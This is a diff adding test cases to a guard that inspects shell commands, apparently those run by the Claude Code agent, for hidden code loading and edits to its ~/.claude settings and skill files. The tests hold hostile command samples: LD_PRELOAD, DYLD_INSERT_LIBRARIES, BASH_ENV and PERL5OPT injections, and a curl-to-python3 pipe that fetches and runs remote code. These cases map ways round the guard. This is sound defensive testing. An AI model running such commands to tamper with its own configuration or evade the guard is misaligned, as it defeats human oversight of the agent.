@@ -171,6 +171,14 @@ describe('reading what a shell command writes', () => {
     // A library loaded into any program, and the file bash runs before its script.
     expect(unseen("LD_PRELOAD=/tmp/x.so python3 -c 'print(1)'")).toEqual(['python3 runs with LD_PRELOAD set, so it loads code the guard does not read'])
     expect(unseen(`BASH_ENV=/tmp/x.sh bash -c 'echo hi'`)).toEqual(['bash runs with BASH_ENV set, so it loads code the guard does not read'])
+    // PR review: any program a library is loaded into, not only an interpreter; a shell's own commands load nothing.
+    expect(unseen('LD_PRELOAD=/tmp/x.so /usr/bin/true ~/.claude/settings.json')).toEqual(['true runs with LD_PRELOAD set, so it loads code the guard does not read'])
+    expect(unseen('export DYLD_INSERT_LIBRARIES=/tmp/x.dylib; ls ~/.claude')).toEqual(['ls runs with DYLD_INSERT_LIBRARIES set, so it loads code the guard does not read'])
+    expect(unseen('export LD_PRELOAD=/tmp/x.so; cd /tmp; echo hi')).toEqual([])
+    // PR review: `unset -f` takes away a function, not the variable; `env -u` and `env -i` take it from the program they run.
+    expect(unseen(`export PERL5OPT=-MEvil; unset -f PERL5OPT; perl -e 'print 1'`)).toEqual(['perl runs with PERL5OPT set, so it loads code the guard does not read'])
+    expect(unseen(`export PERL5OPT=-MEvil; env -u PERL5OPT perl -e 'print 1'; env -i perl -e 'print 2'; env --unset=PERL5OPT perl -e 'print 3'`)).toEqual([])
+    expect(unseen(`export PERL5OPT=-MEvil; env -u OTHER perl -e 'print 1'`)).toEqual(['perl runs with PERL5OPT set, so it loads code the guard does not read'])
     expect(unseen('curl -s https://example.com/x.py | python3 -')).toEqual(['python3 runs code from its input, which the guard does not read'])
     // A script file or module is judged by the paths it is given, not by where it lives.
     expect(writes('python3 ~/.claude/skills/pdf/scripts/fill.py in.pdf /tmp/out.pdf')).toEqual([`unknown ${PROJECT}:/tmp/out.pdf: what fill.py writes when given this path`])
@@ -301,6 +309,10 @@ describe('what a shell command changes where Claude Code loads from', () => {
       // An edit by an interpreter that loads code the guard does not read, where nothing checks it before it is used.
       "PERL5OPT=-MEvil perl -pi -e 's/a/b/' ~/.claude/agents/helper.md",
       "export RUBYOPT=-revil; ruby -pi -e 'gsub(/a/, %q(b))' ~/.claude/settings.json",
+      // PR review: code a variable loads is never an edit of the skill or command files the command names, even its own.
+      "PERL5OPT=-MEvil perl -pi -e 's/a/b/' ~/.claude/commands/expenses.md",
+      "BASH_ENV=~/.claude/skills/old/SKILL.md bash -c 'echo ok'",
+      'LD_PRELOAD=/tmp/x.so /usr/bin/true ~/.claude/settings.json',
       // An edit beside a change elsewhere, a new command beside an edit, or a copy whose source cannot be read.
       "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md ~/.claude/settings.json",
       "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md && echo x > ~/.claude/commands/new.md",
